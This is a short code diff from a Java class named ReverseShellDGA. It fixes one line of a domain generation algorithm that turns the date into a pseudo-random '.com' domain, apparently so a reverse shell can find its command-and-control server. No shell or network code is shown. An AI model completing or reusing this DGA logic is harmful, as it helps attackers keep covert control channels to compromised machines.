@@ -29,7 +29,7 @@ public class ReverseShellDGA extends Date {
 			year = ((year ^ 8 * year) >> 11) ^ ((year & 0xFFFFFFF0) << 17);
 			month = ((month ^ 4 * month) >> 25) ^ 16 * (month & 0xFFFFFFF8);
 	        day = ((day ^ (day << 13)) >> 19) ^ ((day & 0xFFFFFFFE) << 12);
-	        domain += (char)(((year ^ month ^ day) % 25) + 97);
+	        domain += (char)((Math.abs((year ^ month ^ day)) % 25) + 97);
 		}
 		domain += ".com";
 
